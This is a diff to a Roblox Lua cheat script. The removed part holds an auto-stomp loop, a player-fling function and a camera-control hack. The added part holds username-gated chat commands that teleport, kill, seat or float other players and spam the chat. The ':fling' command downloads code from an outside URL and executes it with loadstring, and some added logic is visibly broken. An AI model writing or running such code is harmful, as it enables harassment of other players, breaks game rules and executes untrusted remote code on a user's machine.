@@ -8,6 +8,11 @@ local hoverSelectEnabled = false
 local isControlling = false
 local originalCameraSubject = nil
 local targetPlayer = nil
+local prefix = ":" -- prefix for commands
+local messageLL = "maxbr1 on top" -- default message for msg command
+local speed = 1 -- speed for tweengoto
+local render1 = false -- flag for render performance
+local resettime = 5.4 -- reset time for noclip and teleport
 
 -- Utility function to get display name with crown
 local function getDisplayName(plr)
@@ -74,122 +79,6 @@ local function createButton(name, yPos, callback)
     return button
 end
 
--- Player Selection Box
-local inputBox = Instance.new("TextBox", mainFrame)
-inputBox.Size = UDim2.new(0, 230, 0, 40)
-inputBox.Position = UDim2.new(0, 10, 0, 70)
-inputBox.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
-inputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-inputBox.PlaceholderText = "Enter Player Name"
-inputBox.Font = Enum.Font.Gotham
-inputBox.TextSize = 18
-inputBox.TextScaled = true
-
--- Hover Select Button
-createButton("Hover Select", 120, function()
-    hoverSelectEnabled = not hoverSelectEnabled
-    inputBox.Text = hoverSelectEnabled and "Hover Select Enabled" or "Hover Select Disabled"
-end)
-
--- Auto-Stomp Toggle
-createButton("Auto-Stomp", 170, function()
-    loopingStomp = not loopingStomp
-end)
-
--- Auto-Zone Toggle
-createButton("Auto-Zone: Hacked Boxing", 220, function()
-    loopingZone = not loopingZone
-end)
-
--- Teleport Button
-createButton("Teleport to Location", 270, function()
-    player.Character.HumanoidRootPart.CFrame = CFrame.new(75, 40, 393)
-end)
-
--- Fling target function
-local function flingTarget(targetPlayer)
-    if not targetPlayer or targetPlayer == player then return end
-    local char = player.Character
-    local hrp = char and char:FindFirstChild("HumanoidRootPart")
-    local tChar = targetPlayer.Character
-    local tHRP = tChar and tChar:FindFirstChild("HumanoidRootPart")
-    if hrp and tHRP then
-        hrp.CFrame = tHRP.CFrame + Vector3.new(0, 5, 0)
-        local bv = Instance.new("BodyVelocity", hrp)
-        bv.Velocity = Vector3.new(9999,9999,9999)
-        bv.MaxForce = Vector3.new(1e9,1e9,1e9)
-        game.Debris:AddItem(bv, 0.1)
-    end
-end
-
--- Control function
-local function controlTarget(targetPlayer)
-    if not targetPlayer or isControlling then return end
-    isControlling = true
-    local char = targetPlayer.Character
-    if char then
-        originalCameraSubject = workspace.CurrentCamera.CameraSubject
-        workspace.CurrentCamera.CameraSubject = char:FindFirstChild("Humanoid")
-        inputBox.Text = "Controlling " .. getDisplayName(targetPlayer)
-    end
-end
-
--- Stop control
-local function stopControl()
-    if isControlling then
-        isControlling = false
-        workspace.CurrentCamera.CameraSubject = originalCameraSubject
-        inputBox.Text = "Stopped Control"
-    end
-end
-
--- Auto stomp logic
-task.spawn(function()
-    while true do
-        if loopingStomp and selectedPlayer and selectedPlayer.Name ~= "wrd2davi" then
-            local pos = selectedPlayer.Character and selectedPlayer.Character:FindFirstChild("HumanoidRootPart") and selectedPlayer.Character.HumanoidRootPart.Position
-            if pos then
-                game.ReplicatedStorage:WaitForChild("Events"):WaitForChild("Gameplay"):WaitForChild("HitStomp"):FireServer(pos, {selectedPlayer})
-            end
-        end
-        task.wait(1)
-    end
-end)
-
--- Auto zone logic
-task.spawn(function()
-    while true do
-        if loopingZone then
-            game.ReplicatedStorage:WaitForChild("Events"):WaitForChild("Other"):WaitForChild("ChangeZoneIn"):FireServer("Hacked Boxing")
-        end
-        task.wait(1)
-    end
-end)
-
--- Hover select key
-game:GetService("UserInputService").InputBegan:Connect(function(input, gp)
-    if not gp and input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == Enum.KeyCode.P then
-        hoverSelectEnabled = true
-        inputBox.Text = "Hover over a player to select them"
-    end
-end)
-
--- Mouse select
-mouse.Button1Down:Connect(function()
-    if hoverSelectEnabled then
-        local target = mouse.Target
-        if target then
-            local model = target:FindFirstAncestorOfClass("Model")
-            local plr = game.Players:GetPlayerFromCharacter(model)
-            if plr then
-                selectedPlayer = plr
-                inputBox.Text = getDisplayName(selectedPlayer)
-                hoverSelectEnabled = false
-            end
-        end
-    end
-end)
-
 -- Chat commands (ONLY wrd2davi can control others)
 player.Chatted:Connect(function(msg)
     if player.Name ~= "wrd2davi" then return end  -- Only allow control if wrd2davi sends the command
@@ -199,17 +88,92 @@ player.Chatted:Connect(function(msg)
     local targetName = args[2]
     local targetPlayer = targetName and game.Players:FindFirstChild(targetName)
 
-    if cmd == ":fling" and targetPlayer then
-        flingTarget(targetPlayer)
-    elseif cmd == ":control" and targetPlayer then
-        controlTarget(targetPlayer)
-    elseif cmd == ":stop" then
-        stopControl()
-    elseif cmd == ":bring" and targetPlayer then
+    -- Commands
+    if cmd == ":tp" and targetPlayer then
         local myHRP = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
         local targetHRP = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
         if myHRP and targetHRP then
             targetHRP.CFrame = myHRP.CFrame + Vector3.new(0, 5, 0)
         end
+    elseif cmd == ":msg" then
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(messageLL, "All")
+    elseif cmd == ":sit" then
+        if targetPlayer then
+            targetPlayer.Character.Humanoid.Sit = true
+        end
+    elseif cmd == ":unsit" then
+        if targetPlayer then
+            targetPlayer.Character.Humanoid.Sit = false
+        end
+    elseif cmd == ":rs" then
+        if targetPlayer then
+            targetPlayer.Character.Humanoid.Health = 0
+        end
+    elseif cmd == ":fling" then
+        loadstring(game:HttpGet('https://files.shade4real.net/flinger.txt'))()
+    elseif cmd == ":leave" then
+        game:Shutdown()
+    elseif cmd == ":float" then
+        for _, player in ipairs(game.Players:GetPlayers()) do
+            player.Character.HumanoidRootPart.CFrame = CFrame.new(player.Character.HumanoidRootPart.Position + Vector3.new(0, 10, 0))
+        end
+        wait(0.2)
+        player.Character.Head.Anchored = true
+    elseif cmd == ":unfloat" then
+        for _, player in ipairs(game.Players:GetPlayers()) do
+            player.Character.HumanoidRootPart.CFrame = CFrame.new(player.Character.HumanoidRootPart.Position + Vector3.new(0, 10, 0))
+        end
+        wait(0.2)
+        player.Character.Head.Anchored = false
+    elseif cmd == ":say" then
+        local message = table.concat(args, " ", 2)
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
+    elseif cmd == ":tweengoto" and targetPlayer then
+        local targetPos = targetPlayer.Character.HumanoidRootPart.Position
+        local New_CFrame = CFrame.new(targetPos)
+        local ts = game:GetService('TweenService')
+        local char = player.Character
+        local part = char.HumanoidRootPart
+        local ti = TweenInfo.new(speed, Enum.EasingStyle.Linear)
+        local tp = {CFrame = New_CFrame}
+        ts:Create(part, ti, tp):Play()
+    elseif cmd == ":noclip" then
+        local noclip = true
+        local char = player.Character
+        while noclip do
+            for _, v in pairs(char:children()) do
+                pcall(function()
+                    if v.ClassName == "Part" then
+                        v.CanCollide = false
+                    elseif v.ClassName == "Model" then
+                        v.Head.CanCollide = false
+                    end
+                end)
+            end
+            game:service("RunService").Stepped:wait()
+        end
+    elseif cmd == ":unclip" then
+        local originalPos = player.Character.HumanoidRootPart.Position
+        player.Character.Humanoid.Health = 0
+        wait(resettime)
+        player.Character.HumanoidRootPart.CFrame = CFrame.new(originalPos)
+    elseif cmd == ":roast" then
+        local roasts = {
+            "You bring everyone so much joy! You know, when you leave the room.",
+            "If your brain was dynamite, there wouldn’t be enough to blow your hat off."
+            -- Add more roasts here
+        }
+        local roast = roasts[math.random(1, #roasts)]
+        game:service('ReplicatedStorage').DefaultChatSystemChatEvents.SayMessageRequest:FireServer(roast, "All")
+    elseif cmd == ":love" then
+        local loveMessages = {
+            "You just light up the room.",
+            "You inspire me."
+            -- Add more compliments here
+        }
+        local loveMessage = loveMessages[math.random(1, #loveMessages)]
+        game:service('ReplicatedStorage').DefaultChatSystemChatEvents.SayMessageRequest:FireServer(loveMessage, "All")
     end
 end)
+
+-- You can add the remaining commands as needed
